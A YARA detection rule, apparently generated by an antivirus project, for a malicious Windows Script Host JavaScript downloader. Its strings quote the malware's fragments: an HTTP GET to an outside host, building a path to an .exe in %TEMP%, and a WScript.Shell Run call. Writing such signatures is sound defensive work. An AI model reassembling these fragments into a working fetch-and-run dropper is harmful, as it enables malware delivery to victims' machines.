rule sig_20160329_515771f1c310b95d6f9bac4793ca1e59 {
  meta:
    description = "datamaliciousorder - file 20160329_515771f1c310b95d6f9bac4793ca1e59.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "506740c3ad7042565620435de521eb9fec1cbfd29152feb80fcbc4c1198b8a8d"

  strings:
    $s1  = "Wi[A](\"GET\", \"http://blog.saletron.net/li9soz\", false);" fullword ascii
    $s2  = "function Iq() {return B[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"dBMceEbETP.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[te](X() * 11); if (Wi[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function tW(I, Sm){E = E * 1; return I - Sm;};" fullword ascii
    $s5  = "var B = function f() {return WScript[b](\"WScript.Shell\");}(), S = 11;" fullword ascii
    $s6  = "function vW(){return \"\" + f0;};" fullword ascii
    $s7  = "function y() {return ((fi == true) && (fi == Rn)) ? 1 : E;};" fullword ascii
    $s8  = "function d(Cg){B[\"Run\"](Cg, E, E);};" fullword ascii
    $s9  = "function z(){return b;};" fullword ascii
    $s10 = "return tW(RS, O);" fullword ascii
    $s11 = " while (L){" fullword ascii
    $s12 = "function h(l) {var SI = (1, 2, 3, 4, 5, l); return SI;};" fullword ascii
    $s13 = "function uy()" fullword ascii
    $s14 = "var vi = new this[\"Date\"]();" fullword ascii
    $s15 = "function X(){return 22;};" fullword ascii
    $s16 = "fi = true; " fullword ascii
    $s17 = "var fi = false;" fullword ascii
    $s18 = "Rn = true; " fullword ascii
    $s19 = "var Rn = false;" fullword ascii
    $s20 = "} catch(dN){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}